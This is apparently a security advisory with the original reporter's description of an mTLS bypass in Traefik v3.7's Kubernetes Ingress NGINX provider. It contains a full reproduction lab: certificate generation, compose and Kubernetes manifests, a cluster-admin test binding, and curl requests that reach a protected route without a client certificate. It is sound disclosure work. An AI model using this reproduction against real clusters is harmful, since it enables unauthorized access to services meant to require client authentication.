## Summary

There is a high severity vulnerability in Traefik's Kubernetes Ingress NGINX provider. The TLS option generated for an Ingress carrying the `nginx.ingress.kubernetes.io/auth-tls-secret` annotation was named after the Ingress namespace and name, so two Ingress objects sharing the same host, the same client CA secret and the same client-authentication mode produced two distinct TLS options for that host name. Traefik treats that as a TLS options conflict and falls back to the entry point's default TLS configuration, which does not request a client certificate, so a route configured with `nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"` becomes reachable without one. The generated option name is now derived from the client CA secret and the client-authentication mode alone, so Ingresses expressing the same mTLS policy resolve to a single TLS option. Only the v3.7 line is affected: the Ingress NGINX provider's client-authentication handling was introduced in v3.7.0, and neither Traefik v2 nor the v3 lines up to v3.6 carry it.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.7.11

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<summary>Original Description</summary>

## Summary

Traefik v3.7.9's Kubernetes Ingress NGINX provider can assign different TLS
option names to two Ingress objects that use the same host, the same
`auth-tls-secret`, and the same client-authentication mode. When those routers
share an SNI/host, Traefik treats the TLS option selection as ambiguous and
falls back to the entrypoint's default TLS configuration.

The default TLS configuration does not require a client certificate. As a
result, a route configured with
`nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"` can become reachable
without a client certificate when another Ingress for the same host introduces
the TLS-option conflict.

This behavior was reproduced end to end with the official `traefik:v3.7.9`
image and the Kubernetes Ingress NGINX provider.

## Affected configuration

The issue requires at least two HTTPS Ingress objects for the same host. Both
objects use the same client CA and client-authentication mode, but have
different Ingress names. The relevant parts of the two objects are:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: protected-ingress
  namespace: mtls-conflict-lab
  annotations:
    nginx.ingress.kubernetes.io/auth-tls-secret: "mtls-conflict-lab/client-ca"
    nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"
spec:
  ingressClassName: nginx
  tls:
    - hosts:
        - mtls.example.test
      secretName: server-tls
  rules:
    - host: mtls.example.test
      http:
        paths:
          - path: /protected
            pathType: Prefix
            backend:
              service:
                name: backend
                port:
                  name: http
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: same-host-second-ingress
  namespace: mtls-conflict-lab
  annotations:
    nginx.ingress.kubernetes.io/auth-tls-secret: "mtls-conflict-lab/client-ca"
    nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"
spec:
  ingressClassName: nginx
  tls:
    - hosts:
        - mtls.example.test
      secretName: server-tls
  rules:
    - host: mtls.example.test
      http:
        paths:
          - path: /second
            pathType: Prefix
            backend:
              service:
                name: backend
                port:
                  name: http
```

The two generated TLS option names observed in the Traefik configuration were:

```text
mtls-conflict-lab-protected-ingress-mtls-conflict-lab-client-ca
mtls-conflict-lab-same-host-second-ingress-mtls-conflict-lab-client-ca
```

These are generated TLS option identifiers, not files or directories. Both
options had `clientAuthType: RequireAndVerifyClientCert`, but their names were
different because the Ingress identity was included in the generated name.

Traefik then logged:

```text
On EntryPoint "websecure", Host "mtls.example.test" is served by multiple routers with different TLS options, default TLSOptions will be applied
```

The default TLS configuration has no client-authentication requirement.

## Reproduction

The following describes the complete lab. No directory attachment is required.
The lab used Traefik v3.7.9, k3s v1.31.5-k3s1, and the Kubernetes Ingress NGINX
provider.

### Certificates

The test uses four ordinary PEM files:

- `ca.crt`: CA used by Traefik to verify client certificates.
- `server.crt` and `server.key`: server certificate and key. The certificate
  contains `mtls.example.test` and `control.mtls.example.test` as DNS SANs.
- `client.crt` and `client.key`: a client certificate signed by `ca.crt`.

They can be generated locally with OpenSSL as follows:

```bash
mkdir -p certs

openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
  -keyout certs/ca.key -out certs/ca.crt \
  -subj "/CN=mtls-conflict-lab-ca"

openssl req -newkey rsa:2048 -nodes \
  -keyout certs/server.key -out certs/server.csr \
  -subj "/CN=mtls.example.test"

cat > certs/server.ext <<'EOF'
[server_ext]
basicConstraints=CA:FALSE
keyUsage=digitalSignature,keyEncipherment
extendedKeyUsage=serverAuth
subjectAltName=DNS:mtls.example.test,DNS:control.mtls.example.test
EOF

openssl x509 -req -days 3650 -sha256 \
  -in certs/server.csr -CA certs/ca.crt -CAkey certs/ca.key \
  -CAcreateserial -out certs/server.crt \
  -extfile certs/server.ext -extensions server_ext

openssl req -newkey rsa:2048 -nodes \
  -keyout certs/client.key -out certs/client.csr \
  -subj "/CN=mtls-conflict-lab-client"

cat > certs/client.ext <<'EOF'
[client_ext]
basicConstraints=CA:FALSE
keyUsage=digitalSignature,keyEncipherment
extendedKeyUsage=clientAuth
EOF

openssl x509 -req -days 3650 -sha256 \
  -in certs/client.csr -CA certs/ca.crt -CAkey certs/ca.key \
  -CAcreateserial -out certs/client.crt \
  -extfile certs/client.ext -extensions client_ext
```

### Traefik and k3s

The static Traefik configuration was equivalent to:

```yaml
services:
  k3s:
    image: rancher/k3s:v1.31.5-k3s1
    privileged: true
    command:
      - server
      - --disable=traefik
      - --disable=servicelb
      - --tls-san=host.docker.internal
      - --write-kubeconfig=/output/kubeconfig.yaml
      - --write-kubeconfig-mode=644
    ports:
      - "16448:6443"
      - "18448:8443"
    volumes:
      - ./k3s/output:/output

  traefik:
    image: traefik:v3.7.9
    network_mode: "service:k3s"
    command:
      - --entrypoints.websecure.address=:8443
      - --providers.kubernetesingressnginx=true
      - --providers.kubernetesingressnginx.endpoint=https://127.0.0.1:6443
      - --providers.kubernetesingressnginx.token=${K3S_TOKEN}
      - --providers.kubernetesingressnginx.certauthfilepath=/etc/traefik/k3s/server-ca.crt
      - --providers.kubernetesingressnginx.ingressclass=nginx
      - --providers.kubernetesingressnginx.controllerclass=k8s.io/ingress-nginx
      - --log.level=DEBUG
      - --accesslog=true
    volumes:
      - ./k3s/server-ca.crt:/etc/traefik/k3s/server-ca.crt:ro
```

The Kubernetes service account used for this isolated test was granted access
to read the test resources. The test backend was an nginx service listening on
port 8080 and returning:

```text
BACKEND_REACHED path=/protected
```

The complete logical Kubernetes resources were:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: mtls-conflict-lab
---
apiVersion: networking.k8s.io/v1
kind: IngressClass
metadata:
  name: nginx
spec:
  controller: k8s.io/ingress-nginx
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: backend-nginx-config
  namespace: mtls-conflict-lab
data:
  default.conf: |
    server {
      listen 8080;
      server_name _;
      access_log /dev/stdout;
      default_type text/plain;
      location / {
        return 200 "BACKEND_REACHED path=$request_uri\n";
      }
    }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend
  namespace: mtls-conflict-lab
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backend
  template:
    metadata:
      labels:
        app: backend
    spec:
      containers:
        - name: nginx
          image: nginx:1.27-alpine
          ports:
            - name: http
              containerPort: 8080
          readinessProbe:
            tcpSocket:
              port: http
          volumeMounts:
            - name: config
              mountPath: /etc/nginx/conf.d/default.conf
              subPath: default.conf
              readOnly: true
      volumes:
        - name: config
          configMap:
            name: backend-nginx-config
---
apiVersion: v1
kind: Service
metadata:
  name: backend
  namespace: mtls-conflict-lab
spec:
  selector:
    app: backend
  ports:
    - name: http
      port: 8080
      targetPort: 8080
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: protected-ingress
  namespace: mtls-conflict-lab
  annotations:
    nginx.ingress.kubernetes.io/auth-tls-secret: "mtls-conflict-lab/client-ca"
    nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"
spec:
  ingressClassName: nginx
  tls:
    - hosts: [mtls.example.test]
      secretName: server-tls
  rules:
    - host: mtls.example.test
      http:
        paths:
          - path: /protected
            pathType: Prefix
            backend:
              service:
                name: backend
                port:
                  name: http
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: same-host-second-ingress
  namespace: mtls-conflict-lab
  annotations:
    nginx.ingress.kubernetes.io/auth-tls-secret: "mtls-conflict-lab/client-ca"
    nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"
spec:
  ingressClassName: nginx
  tls:
    - hosts: [mtls.example.test]
      secretName: server-tls
  rules:
    - host: mtls.example.test
      http:
        paths:
          - path: /second
            pathType: Prefix
            backend:
              service:
                name: backend
                port:
                  name: http
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: single-router-control
  namespace: mtls-conflict-lab
  annotations:
    nginx.ingress.kubernetes.io/auth-tls-secret: "mtls-conflict-lab/client-ca"
    nginx.ingress.kubernetes.io/auth-tls-verify-client: "on"
spec:
  ingressClassName: nginx
  tls:
    - hosts: [control.mtls.example.test]
      secretName: server-tls
  rules:
    - host: control.mtls.example.test
      http:
        paths:
          - path: /protected
            pathType: Prefix
            backend:
              service:
                name: backend
                port:
                  name: http
```

The `server-tls` and `client-ca` Secrets are deliberately created separately so
that private key material does not need to be embedded in the report. Save the
Compose block above as `docker-compose.yml` and the Kubernetes block above as
`k8s-manifest.yml` before running the following commands.

### Commands and results

```bash
docker compose up -d k3s

until test -f k3s/output/kubeconfig.yaml; do sleep 2; done
docker cp "$(docker compose ps -q k3s):/var/lib/rancher/k3s/server/tls/server-ca.crt" \
  k3s/server-ca.crt

export KUBECONFIG="$PWD/k3s/output/kubeconfig.yaml"
sed -i.bak 's#https://127.0.0.1:6443#https://127.0.0.1:16448#' \
  k3s/output/kubeconfig.yaml
until kubectl get nodes >/dev/null 2>&1; do sleep 2; done

kubectl -n kube-system create serviceaccount traefik-validation
kubectl create clusterrolebinding traefik-validation \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:traefik-validation
kubectl apply -f k8s-manifest.yml
kubectl -n mtls-conflict-lab create secret tls server-tls \
  --cert=certs/server.crt --key=certs/server.key
kubectl -n mtls-conflict-lab create secret generic client-ca \
  --from-file=ca.crt=certs/ca.crt

export K3S_TOKEN="$(kubectl -n kube-system create token traefik-validation)"
K3S_TOKEN="$K3S_TOKEN" docker compose up -d traefik
kubectl -n mtls-conflict-lab rollout status deployment/backend --timeout=120s
sleep 4
```

Request to the same-host split configuration without a client certificate:

```bash
curl --http1.1 -sk -D - -o - \
  --resolve mtls.example.test:18448:127.0.0.1 \
  https://mtls.example.test:18448/protected
```

Observed result on `traefik:v3.7.9`:

```text
HTTP/1.1 200 OK
BACKEND_REACHED path=/protected
```

The same request with a valid client certificate also returned `200 OK`:

```bash
curl --http1.1 -sk -D - -o - \
  --resolve mtls.example.test:18448:127.0.0.1 \
  --cert certs/client.crt --key certs/client.key \
  https://mtls.example.test:18448/protected
```

Control request to a host served by a single Ingress, without a client
certificate:

```bash
curl --http1.1 -sk -D - -o - \
  --resolve control.mtls.example.test:18448:127.0.0.1 \
  https://control.mtls.example.test:18448/protected
echo "curl_exit=$?"
```

Observed control result:

```text
curl_exit=56
```

The `-k` option only disables verification of the local server certificate. It
does not provide a client certificate and does not disable server-side
client-authentication.

## Impact and preconditions

An unauthenticated network client can reach a route intended to require mTLS
when all of the following are true:

1. The Kubernetes Ingress NGINX provider is enabled.
2. The same SNI/host is split across multiple HTTPS Ingress objects.
3. The resulting routers receive different TLS option names.
4. At least one of those routes is intended to require and verify client
   certificates.
5. The affected route is reachable by the client.

The issue is configuration-dependent. A host served by a single unambiguous TLS
option is not affected by this specific conflict.

If an untrusted tenant can create another Ingress for an existing host, that
tenant may be able to introduce the conflict. After the conflicting
configuration has been accepted, the network client accessing the route does
not need Kubernetes credentials or a client certificate.

## Suggested remediation

- Reuse one TLS option identity for equivalent host-level client-authentication
  settings rather than including the Ingress identity in the option name.
- Reject or fail closed when same-host routers have conflicting TLS options.
- Do not fall back from `RequireAndVerifyClientCert` to a default
  `NoClientCert` configuration when a same-host conflict involves client auth.
- Add a regression test proving that split same-host Ingress objects cannot
  downgrade `RequireAndVerifyClientCert` to `NoClientCert`.

## Source locations

- `pkg/provider/kubernetes/ingress-nginx/kubernetes.go`: generates and attaches
  the per-Ingress auth-TLS option.
- `pkg/server/router/tcp/manager.go`: resolves same-host TLS options and falls
  back to the default option when they differ.
- `pkg/tls/tlsmanager.go`: initializes the default TLS configuration without a
  client-authentication requirement.


</details>
